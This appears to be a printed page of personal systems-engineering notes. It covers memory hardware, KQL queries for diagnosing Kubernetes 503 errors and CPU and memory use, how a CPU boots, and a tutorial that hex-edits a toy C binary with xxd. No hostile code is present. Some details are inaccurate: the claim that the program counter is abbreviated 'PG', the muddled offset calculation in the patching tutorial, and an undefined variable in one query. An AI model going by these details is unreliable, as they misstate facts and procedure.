<h3 id="memory-hardware"><a class="header" href="#memory-hardware">Memory Hardware</a></h3>
<ul>
<li>
<p>RAM (Main Memory): Dynamic RAM (DRAM), provides high-density storage; each bit is implemented as a capacitor and a transistor; requires a constant refresh to maintain charge. The access time of RAM can be measured as the column address strobe (CAS) latency. CAS is the time between sending a memory module the desired address to fetch and when the data is available to read. For DDR4 it is around 10-20 nanoseconds.</p>
</li>
<li>
<p>CPU caches</p>
<ul>
<li>Level 1: Usually split into separate instruction and data caches</li>
<li>Level 2: A cache for both instructions and data</li>
<li>Level 3: Another larger level of cache</li>
</ul>
</li>
</ul>
<h3 id="mmu-memory-management-unit"><a class="header" href="#mmu-memory-management-unit">MMU (Memory Management Unit)</a></h3>
<ul>
<li>The MMU is response for virtual-to-physical address translations. These are performed per-page, and offsets within a page are mapped directly.</li>
</ul>
<h3 id="tlb-translation-lookaside-buffer"><a class="header" href="#tlb-translation-lookaside-buffer">TLB (Translation Lookaside Buffer)</a></h3>
<ul>
<li>The TLB is used by the MMU as the first level of address translation cache, followed by the page table in main memory.</li>
</ul>
<h3 id="tools-5"><a class="header" href="#tools-5">Tools</a></h3>
<ul>
<li><code>vmstat</code></li>
<li><code>swapon</code></li>
<li><code>sar</code></li>
<li><code>slabtop</code></li>
<li><code>numastat</code></li>
<li><code>ps</code></li>
<li><code>top</code> / <code>htop</code></li>
<li><code>pmap</code></li>
<li><code>perf</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-playbook"><a class="header" href="#troubleshooting-playbook">Troubleshooting Playbook</a></h1>
<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
<ul>
<li><a href="#troubleshooting-503s-for-apps-in-kubernetes">kubernetes-containerized-app-503s</a></li>
<li><a href="#general-troubleshootingnotes">kubernetes-general</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-503s-for-apps-in-kubernetes"><a class="header" href="#troubleshooting-503s-for-apps-in-kubernetes">Troubleshooting 503s for Apps in Kubernetes</a></h1>
<h3 id="get-the-precise-time-of-the-503-occurrences"><a class="header" href="#get-the-precise-time-of-the-503-occurrences">Get the precise time of the 503 occurrences</a></h3>
<pre><code>let start = todatetime('2023-11-07T04:25:00Z');
let end = todatetime('2023-11-07T05:00:00Z');
nginxAccessLogs
| where time_iso8601 between (start .. end)
| where host endswith ".aprimo.com"
| where status == 503
| where request_uri has '/api/ui/unauth-init'
| make-series count() default = 0 on time_iso8601 from start to end step 1s by host
| render timechart
</code></pre>
<h3 id="check-if-there-were-any-pods-running-during-the-incident"><a class="header" href="#check-if-there-were-any-pods-running-during-the-incident">Check if there were any pods running during the incident:</a></h3>
<pre><code>let start = todatetime('2023-11-07T04:00:00Z');
let end = todatetime('2023-11-07T05:00:00Z');
let nameprefix = "pod name prefix"
KubePodInventory
| where TimeGenerated between (start .. end)
| where Name contains nameprefix
| make-series count() default = 0 on TimeGenerated from start to end step 1m by PodStatus
| render timechart
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="general-troubleshootingnotes"><a class="header" href="#general-troubleshootingnotes">General troubleshooting/notes</a></h1>
<h3 id="get-pod-names-running-in-a-replica-set-at-a-given-time"><a class="header" href="#get-pod-names-running-in-a-replica-set-at-a-given-time">Get pod names running in a replica set at a given time</a></h3>
<pre><code>let start = todatetime('2023-11-07T04:00:00Z');
let end = todatetime('2023-11-07T05:00:00Z');
let nameprefix = "pod name prefix"
KubePodInventory
| where TimeGenerated between (start .. end)
| where Name startswith nameprefix
| distinct Name
</code></pre>
<h3 id="get-node-names-running-during-a-given-time-duration"><a class="header" href="#get-node-names-running-during-a-given-time-duration">Get node names running during a given time duration:</a></h3>
<pre><code>let start = todatetime('2023-11-07T04:00:00Z');
let end = todatetime('2023-11-07T05:00:00Z');
let nameprefix = "aksnpwin8"
KubeNodeInventory
| where TimeGenerated between (start .. end)
| where Computer startswith nameprefix
</code></pre>
<h3 id="get-cpu-utilization-avg-per-microservice"><a class="header" href="#get-cpu-utilization-avg-per-microservice">Get CPU Utilization Avg Per Microservice</a></h3>
<pre><code>let _ResourceLimitCounterName = 'cpuLimitNanoCores';
let _ResourceUsageCounterName = 'cpuUsageNanoCores';
KubePodInventory
| where Namespace in ('dam-c000', 'pm-r01')
| extend
    InstanceName = strcat(ClusterId, '/', ContainerName),
    ContainerName = strcat(ControllerName, '/', tostring(split(ContainerName, '/')[1]))
| distinct Computer, InstanceName
| join kind=inner hint.strategy=shuffle (
    Perf
    | where ObjectName == 'K8SContainer' and CounterName == _ResourceLimitCounterName
    | summarize MaxLimitValue = max(CounterValue) by Computer, InstanceName, bin(TimeGenerated, _BinSize)
    | project
        Computer,
        InstanceName,
        MaxLimitValue
    )
    on Computer, InstanceName
| join kind=inner hint.strategy=shuffle (
    Perf
    | where ObjectName == 'K8SContainer' and CounterName == _ResourceUsageCounterName
    | project Computer, InstanceName, UsageValue = CounterValue, TimeGenerated
    )
    on Computer, InstanceName
| project
    ContainerName = tostring(split(InstanceName, '/')[10]),
    Computer,
    TimeGenerated,
    UsagePercent = UsageValue * 100.0 / MaxLimitValue
| summarize AvgCPUUsagePercentage = avg(UsagePercent) by bin(TimeGenerated, 1h), ContainerName
| render timechart;
</code></pre>
<h3 id="get-memory-utilization-avg-per-microservice"><a class="header" href="#get-memory-utilization-avg-per-microservice">Get Memory Utilization Avg per Microservice</a></h3>
<pre><code>let _ResourceLimitCounterName = 'memoryLimitBytes';
let _ResourceUsageCounterName = 'memoryWorkingSetBytes';
KubePodInventory
| where Namespace in ('dam-c000', 'pm-r01')
| extend InstanceName = strcat(ClusterId, '/', ContainerName),
    ContainerName = strcat(ControllerName, '/', tostring(split(ContainerName, '/')[1]))
| distinct Computer, InstanceName, ContainerName
| join kind=inner hint.strategy=shuffle (
    Perf
    | where ObjectName == 'K8SContainer' and CounterName == _ResourceLimitCounterName
    | summarize MaxLimitValue = max(CounterValue) by Computer, InstanceName, bin(TimeGenerated, 1h)
    | project
        Computer,
        InstanceName,
        MaxLimitValue
    )
    on Computer, InstanceName
| join kind=inner hint.strategy=shuffle (
    Perf
    | where ObjectName == 'K8SContainer' and CounterName == _ResourceUsageCounterName
    | project Computer, InstanceName, UsageValue = CounterValue, TimeGenerated
    )
    on Computer, InstanceName
| project
    AppName = tostring(split(InstanceName, '/')[10]),
    Computer,
    TimeGenerated,
    UsagePercent = UsageValue * 100.0 / MaxLimitValue
| summarize MemoryUsagePercentage = avg(UsagePercent) by bin(TimeGenerated, 1h), AppName
| render timechart;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-happens-when"><a class="header" href="#what-happens-when">What Happens When‚Ä¶</a></h1>
<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
<ul>
<li><a href="#what-happens-when-a-cpu-starts">a-cpu-starts</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-happens-when-a-cpu-starts"><a class="header" href="#what-happens-when-a-cpu-starts">What happens when a CPU starts?</a></h1>
<ul>
<li>
<p>When a CPU receives power, it resets by receiving a pulse on its <code>RESET</code> (or RST) pin. This is because when the power supply is first powering up, even if it only takes a second or two, the CPU has already received ‚Äúdirty‚Äù power, because the power supply was building up a steady stream of electricity while powering up. Digital logic chips like CPUs require precise voltages, and they get confused if they receive something outside their intended voltage range. This is why the CPU must be reset immediately after powering up. The reset pin must be activated for a certain number of clock cycles to fully reset the CPU.</p>
</li>
<li>
<p>After being reset, the CPU can get to work. The CPU gets some instructions from memory, in what is known as a ‚Äòfetch‚Äô cycle. Memory can be either RAM or ROM. RAM is like the CPUs workbench. ROM stored code that is read-only and controls the system itself. The CPU always fetches code from ROM first so that it knows what its job is. The CPU address memory (both RAM and ROM) through the address bus. The CPU has two buses, the address bus and the data bus. The memory responds to this request from the CPU on the address bus by sending the contents of the selected memory address over the data bus, back to the CPU.</p>
</li>
<li>
<p>Every CPU has a particular point in memory where it begins reading instructions after it has been reset. Some CPUs will jump to a set memory address and begin executing that code. Other CPUs have a ‚Äòreset vector‚Äô, which means that it first checks a particular point in memory for a number which is the memory address to begin executing instructions at.</p>
</li>
<li>
<p>The CPU contains a register (internal cache memory, extremely fast) called the instruction pointer, which contains a number. The number in the instruction pointer (IP) is the memory address at which the next instruction is to be performed. The IP is incremented with each instruction, and in the event of a jump (JMP) instruction, which tells the CPU to jump to another location and start running the instructions there, the IP is set to the jump location and then CPU continues on its way from there. The CPU‚Äôs instructions are sometimes called ‚Äúopcodes‚Äù. They are simply strings of binary 1s and 0s which together form an instruction. For example, on a standard Intel 80x86 CPU (such as a 486 or Pentium), the opcode 90h (or 10010000 binary) is a NOP (no operation) opcode. NOP is the simplest instruction in any CPU, and it simply means to do nothing and go on to the next instruction. If a cell in RAM or ROM contains this opcode and the CPU executes it, it will perform a NOP (in other words, it will do nothing) and then IP will be set to the next memory cell. (On some computer platforms, the instruction pointer is called the ‚Äúprogram counter‚Äù, inexplicably abbreviated ‚ÄúPG‚Äù. However, on the PC (as in ‚ÄúIBM PC‚Äù) platform, the term ‚Äúinstruction pointer‚Äù is usually used, because that term is preferred by Intel with regard to its 80x86 CPU family.)</p>
</li>
<li>
<p>Regardless of where the CPU begins getting its instructions, the beginning point should always be somewhere in a ROM chip. The computer needs startup instructions to perform basic hardware checking and preparation (POST), and these are contained in a ROM chip on the motherboard called the BIOS. This is where any computer begins executing its code when it is turned on.</p>
</li>
<li>
<p>Once the BIOS code has been executed, what happens next depends entirely on what is in the BIOS, although normally the BIOS will begin looking for a disk drive of some kind and start executing the instructions there (which is usually an operating system). From that point onward, the OS takes over and usually runs a shell which the user then uses to operate the computer.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="fun-stuff"><a class="header" href="#fun-stuff">Fun Stuff</a></h1>
<ul>
<li><a href="#modifying-machine-code-in-executables">modify machine code</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="modifying-machine-code-in-executables"><a class="header" href="#modifying-machine-code-in-executables">Modifying Machine Code in Executables</a></h1>
<p><strong>requires xxd and objdump</strong></p>
<p>We have a very simple program written in C that prints ‚Äúab‚Äù followed by a newline:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int main() {
  putchar('a');
  putchar('b');
  putchar('\n');
}
</code></pre>
<p>Compile it:</p>
<pre><code class="language-bash">gcc -o main main.c
</code></pre>
<p>Now, let‚Äôs look at the machine code of the compiled executable using <code>objdump</code>:</p>
<pre><code class="language-bash">Œª workspace $ objdump -d main

main:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 &lt;_init&gt;:
    1000:       f3 0f 1e fa             endbr64
    1004:       48 83 ec 08             sub    $0x8,%rsp
    1008:       48 8b 05 c1 2f 00 00    mov    0x2fc1(%rip),%rax        # 3fd0 &lt;__gmon_start__@Base&gt;
    100f:       48 85 c0                test   %rax,%rax
    1012:       74 02                   je     1016 &lt;_init+0x16&gt;
    1014:       ff d0                   call   *%rax
    1016:       48 83 c4 08             add    $0x8,%rsp
    101a:       c3                      ret

Disassembly of section .plt:

0000000000001020 &lt;putchar@plt-0x10&gt;:
    1020:       ff 35 ca 2f 00 00       push   0x2fca(%rip)        # 3ff0 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;
    1026:       ff 25 cc 2f 00 00       jmp    *0x2fcc(%rip)        # 3ff8 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;
    102c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000001030 &lt;putchar@plt&gt;:
    1030:       ff 25 ca 2f 00 00       jmp    *0x2fca(%rip)        # 4000 &lt;putchar@GLIBC_2.2.5&gt;
    1036:       68 00 00 00 00          push   $0x0
    103b:       e9 e0 ff ff ff          jmp    1020 &lt;_init+0x20&gt;

Disassembly of section .text:

0000000000001040 &lt;_start&gt;:
    1040:       f3 0f 1e fa             endbr64
    1044:       31 ed                   xor    %ebp,%ebp
    1046:       49 89 d1                mov    %rdx,%r9
    1049:       5e                      pop    %rsi
    104a:       48 89 e2                mov    %rsp,%rdx
    104d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
    1051:       50                      push   %rax
    1052:       54                      push   %rsp
    1053:       45 31 c0                xor    %r8d,%r8d
    1056:       31 c9                   xor    %ecx,%ecx
    1058:       48 8d 3d da 00 00 00    lea    0xda(%rip),%rdi        # 1139 &lt;main&gt;
    105f:       ff 15 5b 2f 00 00       call   *0x2f5b(%rip)        # 3fc0 &lt;__libc_start_main@GLIBC_2.34&gt;
    1065:       f4                      hlt
    1066:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
    106d:       00 00 00
    1070:       48 8d 3d a1 2f 00 00    lea    0x2fa1(%rip),%rdi        # 4018 &lt;__TMC_END__&gt;
    1077:       48 8d 05 9a 2f 00 00    lea    0x2f9a(%rip),%rax        # 4018 &lt;__TMC_END__&gt;
    107e:       48 39 f8                cmp    %rdi,%rax
    1081:       74 15                   je     1098 &lt;_start+0x58&gt;
    1083:       48 8b 05 3e 2f 00 00    mov    0x2f3e(%rip),%rax        # 3fc8 &lt;_ITM_deregisterTMCloneTable@Base&gt;
    108a:       48 85 c0                test   %rax,%rax
    108d:       74 09                   je     1098 &lt;_start+0x58&gt;
    108f:       ff e0                   jmp    *%rax
    1091:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
    1098:       c3                      ret
    1099:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
    10a0:       48 8d 3d 71 2f 00 00    lea    0x2f71(%rip),%rdi        # 4018 &lt;__TMC_END__&gt;
    10a7:       48 8d 35 6a 2f 00 00    lea    0x2f6a(%rip),%rsi        # 4018 &lt;__TMC_END__&gt;
    10ae:       48 29 fe                sub    %rdi,%rsi
    10b1:       48 89 f0                mov    %rsi,%rax
    10b4:       48 c1 ee 3f             shr    $0x3f,%rsi
    10b8:       48 c1 f8 03             sar    $0x3,%rax
    10bc:       48 01 c6                add    %rax,%rsi
    10bf:       48 d1 fe                sar    $1,%rsi
    10c2:       74 14                   je     10d8 &lt;_start+0x98&gt;
    10c4:       48 8b 05 0d 2f 00 00    mov    0x2f0d(%rip),%rax        # 3fd8 &lt;_ITM_registerTMCloneTable@Base&gt;
    10cb:       48 85 c0                test   %rax,%rax
    10ce:       74 08                   je     10d8 &lt;_start+0x98&gt;
    10d0:       ff e0                   jmp    *%rax
    10d2:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)
    10d8:       c3                      ret
    10d9:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
    10e0:       f3 0f 1e fa             endbr64
    10e4:       80 3d 2d 2f 00 00 00    cmpb   $0x0,0x2f2d(%rip)        # 4018 &lt;__TMC_END__&gt;
    10eb:       75 33                   jne    1120 &lt;_start+0xe0&gt;
    10ed:       55                      push   %rbp
    10ee:       48 83 3d ea 2e 00 00    cmpq   $0x0,0x2eea(%rip)        # 3fe0 &lt;__cxa_finalize@GLIBC_2.2.5&gt;
    10f5:       00
    10f6:       48 89 e5                mov    %rsp,%rbp
    10f9:       74 0d                   je     1108 &lt;_start+0xc8&gt;
    10fb:       48 8b 3d 0e 2f 00 00    mov    0x2f0e(%rip),%rdi        # 4010 &lt;__dso_handle&gt;
    1102:       ff 15 d8 2e 00 00       call   *0x2ed8(%rip)        # 3fe0 &lt;__cxa_finalize@GLIBC_2.2.5&gt;
    1108:       e8 63 ff ff ff          call   1070 &lt;_start+0x30&gt;
    110d:       c6 05 04 2f 00 00 01    movb   $0x1,0x2f04(%rip)        # 4018 &lt;__TMC_END__&gt;
    1114:       5d                      pop    %rbp
    1115:       c3                      ret
    1116:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
    111d:       00 00 00
    1120:       c3                      ret
    1121:       0f 1f 40 00             nopl   0x0(%rax)
    1125:       66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
    112c:       00 00 00 00
    1130:       f3 0f 1e fa             endbr64
    1134:       e9 67 ff ff ff          jmp    10a0 &lt;_start+0x60&gt;

0000000000001139 &lt;main&gt;:
    1139:       55                      push   %rbp
    113a:       48 89 e5                mov    %rsp,%rbp
    113d:       bf 61 00 00 00          mov    $0x61,%edi
    1142:       e8 e9 fe ff ff          call   1030 &lt;putchar@plt&gt;
    1147:       bf 62 00 00 00          mov    $0x62,%edi
    114c:       e8 df fe ff ff          call   1030 &lt;putchar@plt&gt;
    1151:       bf 0a 00 00 00          mov    $0xa,%edi
    1156:       e8 d5 fe ff ff          call   1030 &lt;putchar@plt&gt;
    115b:       b8 00 00 00 00          mov    $0x0,%eax
    1160:       5d                      pop    %rbp
    1161:       c3                      ret

Disassembly of section .fini:

0000000000001164 &lt;_fini&gt;:
    1164:       f3 0f 1e fa             endbr64
    1168:       48 83 ec 08             sub    $0x8,%rsp
    116c:       48 83 c4 08             add    $0x8,%rsp
    1170:       c3                      ret
</code></pre>
<p>That‚Äôs a lot of code! The part we‚Äôre interested in is the <code>main</code> function starting at address <code>0x1139</code>. We can focus this a bit by telling objdump to only dump the specific symbol we‚Äôre interested in (main). We also pass the <code>-f</code> flag to get some additional information about the file:</p>
<pre><code>Œª workspace $ objdump --disassemble=main -f main

main:     file format elf64-x86-64
architecture: i386:x86-64, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x0000000000001040


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .text:

0000000000001139 &lt;main&gt;:
    1139:       55                      push   %rbp
    113a:       48 89 e5                mov    %rsp,%rbp
    113d:       bf 61 00 00 00          mov    $0x61,%edi
    1142:       e8 e9 fe ff ff          call   1030 &lt;putchar@plt&gt;
    1147:       bf 62 00 00 00          mov    $0x62,%edi
    114c:       e8 df fe ff ff          call   1030 &lt;putchar@plt&gt;
    1151:       bf 0a 00 00 00          mov    $0xa,%edi
    1156:       e8 d5 fe ff ff          call   1030 &lt;putchar@plt&gt;
    115b:       b8 00 00 00 00          mov    $0x0,%eax
    1160:       5d                      pop    %rbp
    1161:       c3                      ret

Disassembly of section .fini:
</code></pre>
<p>The instruction at address <code>0x1142</code> is responsible for printing the character ‚Äòa‚Äô (ASCII 0x61). The instruction prior to that puts the value <code>0x61</code> (hex for ‚Äòa‚Äô) into the <code>edi</code> register, which is used as an argument to the <code>putchar</code> function. So, we first load the character ‚Äòa‚Äô into <code>edi</code>, then call <code>putchar</code>. <code>putchar</code> looks at <code>edi</code>, sees the value <code>0x61</code>, and prints ‚Äòa‚Äô.</p>
<p>The same can be said for the following two lines. However, at address <code>0x1147</code>, we load <code>0x62</code> (hex for ‚Äòb‚Äô) into <code>edi</code>, and at address <code>0x1151</code>, we load <code>0x0a</code> (hex for newline) into <code>edi</code>.</p>
<p>So, if we wanted to change the program to print ‚Äúac‚Äù instead of ‚Äúab‚Äù, we would need to change the instruction at address <code>0x1147</code> to load <code>0x63</code> (hex for ‚Äòc‚Äô) into <code>edi</code> instead of <code>0x62</code>. Simple.</p>
<p>To disassemble this into a hex dump, we can use <code>xxd</code>:</p>
<pre><code class="language-bash">
Œª workspace $ xxd main &gt; main.asm
Œª workspace $ cat main.asm

The dump is rather lengthy, so I'll only print out the relevant portion
.... redacted ....

00001050: f050 5445 31c0 31c9 488d 3dda 0000 00ff  .PTE1.1.H.=.....
00001060: 155b 2f00 00f4 662e 0f1f 8400 0000 0000  .[/...f.........
00001070: 488d 3da1 2f00 0048 8d05 9a2f 0000 4839  H.=./..H.../..H9
00001080: f874 1548 8b05 3e2f 0000 4885 c074 09ff  .t.H..&gt;/..H..t..
00001090: e00f 1f80 0000 0000 c30f 1f80 0000 0000  ................
000010a0: 488d 3d71 2f00 0048 8d35 6a2f 0000 4829  H.=q/..H.5j/..H)
000010b0: fe48 89f0 48c1 ee3f 48c1 f803 4801 c648  .H..H..?H...H..H
000010c0: d1fe 7414 488b 050d 2f00 0048 85c0 7408  ..t.H.../..H..t.
000010d0: ffe0 660f 1f44 0000 c30f 1f80 0000 0000  ..f..D..........
000010e0: f30f 1efa 803d 2d2f 0000 0075 3355 4883  .....=-/...u3UH.
000010f0: 3dea 2e00 0000 4889 e574 0d48 8b3d 0e2f  =.....H..t.H.=./
00001100: 0000 ff15 d82e 0000 e863 ffff ffc6 0504  .........c......
00001110: 2f00 0001 5dc3 662e 0f1f 8400 0000 0000  /...].f.........
00001120: c30f 1f40 0066 662e 0f1f 8400 0000 0000  ...@.ff.........
00001130: f30f 1efa e967 ffff ff55 4889 e5bf 6100  .....g...UH...a.
00001140: 0000 e8e9 feff ffbf 6200 0000 e8df feff  ........b....... &lt; HERE
00001150: ffbf 0a00 0000 e8d5 feff ffb8 0000 0000  ................
00001160: 5dc3 0000 f30f 1efa 4883 ec08 4883 c408  ].......H...H...
00001170: c300 0000 0000 0000 0000 0000 0000 0000  ................
00001180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00001190: 0000 0000 0000 0000 0000 0000 0000 0000  ................

.... redacted ....

</code></pre>
<p>In the above hex dump, each line starts with an offset (e.g., <code>00001050</code>), followed by the hex representation of the bytes, and finally the ASCII representation on the right. To find the instruction at address <code>0x1147</code>, we need to calculate its offset in the file. The <code>main</code> function starts at <code>0x1139</code>, so the offset of <code>0x1147</code> is <code>0x1147 - 0x1139 = 0xE</code> (14 in decimal). Specifically, we need to look at he line starting with offset <code>00001140</code> and find the 14th byte in that line. I have marked it with <code>&lt; HERE</code> in the above dump. To change this to load <code>0x63</code> instead of <code>0x62</code>, we need to change the byte <code>62</code> to <code>63</code>.</p>
<p>This is the line we‚Äôre interested in:</p>
<pre><code>00001140: 0000 e8e9 feff ffbf 6200 0000 e8df feff  ........b....... &lt; HERE
</code></pre>
<p>And this is what we want to change it to:</p>
<pre><code>00001140: 0000 e8e9 feff ffbf 6300 0000 e8df feff  ........b....... &lt; Notice the 63 (0x63, i.e. 'c')
</code></pre>
<p>To do this, we can open the hex dump in a text editor, make the change, and then write it back to a binary file using <code>xxd</code>:</p>
<pre><code class="language-bash">Œª workspace $ xxd -r main.asm modified_main
</code></pre>
<p>We can then run the modified executable to see the results:</p>
<pre><code class="language-bash">Œª workspace $ ./modified_main
ac
</code></pre>
<p>As you can see, the program now prints ‚Äúac‚Äù instead of ‚Äúab‚Äù. By modifying the machine code directly, we were able to change the behavior of the program without recompiling the source code.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>

        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr-ef4e11c1.min.js"></script>
        <script src="mark-09e88c2c.min.js"></script>
        <script src="searcher-c2a407aa.js"></script>

        <script src="clipboard-1626706a.min.js"></script>
        <script src="highlight-abc7f01d.js"></script>
        <script src="book-a0b12cfe.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>


    </div>
    </body>
</html>
